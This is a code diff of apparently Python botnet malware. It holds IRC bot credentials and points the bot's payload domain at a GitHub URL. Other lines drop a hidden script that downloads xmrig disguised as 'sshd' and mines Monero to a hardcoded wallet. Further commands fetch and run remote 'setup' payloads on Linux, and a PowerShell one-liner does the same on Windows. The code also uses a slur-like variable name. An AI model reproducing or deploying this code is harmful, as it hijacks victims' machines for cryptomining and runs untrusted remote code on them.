@@ -888,7 +888,7 @@ class mainprocess:
                 self.chankey = "WINDOWS10ULTRA"
                 self.knightpasswd = "keyminuskrap"
                 self.masters = "Freak,spot1,spot2,spot3,spot4,spot5,spot6,spot7,spot8,spot9,spot10,spot11,spot12,spot13,spot14,spot15,spot16,spot17,spot18,spot19,spot20"
-                self.injectdomain = ""
+                self.injectdomain = "https://raw.githubusercontent.com/Freeaaak/Freakout-py3/main"
                 mydomain = self.injectdomain
                 protector = "progressive"
                 securesock.close()
@@ -902,7 +902,7 @@ class mainprocess:
         os.system(
             'echo \'ARGS="-o pool.minexmr.com:4444 -u 45Q5mZS74P18E7q3UEMErrLW6GvvT8GQBjFdFVKFdq27VFeTEhyWKDkcZo5XgAT6Qy1JSsMio2oxAj9uEy7dSJY5HTW8RDP -p Network --cpu-no-yield --asm=auto --cpu-memory-pool=-1 -B"; running=$(ps h -C ".bootstrap.sh" | grep -wv $$ | wc -l); [[ $running -ge 1 ]] && exit; curl http://DOMAIN/xmrig1 -O||wget http://DOMAIN/xmrig1 -O xmrig1;mkdir $PWD/.1;mv -f xmrig1 $PWD/.1/sshd;chmod 777 $PWD/.1/sshd;curl http://DOMAIN/xmrig -O||wget http://DOMAIN/xmrig -O xmrig;mkdir $PWD/.2;mv -f xmrig $PWD/.2/sshd;chmod 777 $PWD/.2/sshd;$PWD/.1/sshd $ARGS||$PWD/.2/sshd $ARGS\'>$PWD/.bootstrap.sh;$PWD/.bootstrap.sh&'
         )
-        stupidnigeria = "cd /tmp||cd $(find / -writable -readable -executable | head -n 1);wget http://DOMAIN/setup -O setup||curl http://DOMAIN/setup -O;chmod 777 setup;./setup;wget http://DOMAIN/setup.py -O setup.py||curl http://DOMAIN/setup.py -O;chmod 777 setup.py;python2 setup.py||python2.7 setup.py||python setup.py||./setup.py&".replace(
+        stupidnigeria = "cd /tmp||cd $(find / -writable -readable -executable | head -n 1);wget http://DOMAIN/setup.py -O setup||curl http://DOMAIN/setup.py -O;chmod 777 setup;./setup.py;wget http://DOMAIN/setup.py -O setup.py||curl http://DOMAIN/setup.py -O;chmod 777 setup.py;python2 setup.py||python2.7 setup.py||python setup.py||./setup.py&".replace(
             "DOMAIN", mydomain
         )
         winbox = "@powershell -NoProfile -ExecutionPolicy unrestricted -Command \"(New-Object System.Net.WebClient).DownloadFile('https://github.com/manthey/pyexe/releases/download/v18/py27.exe','python.exe');(New-Object System.Net.WebClient).DownloadFile('http://DOMAIN/setup.py','setup.py');\"&.\python.exe setup.py".replace(
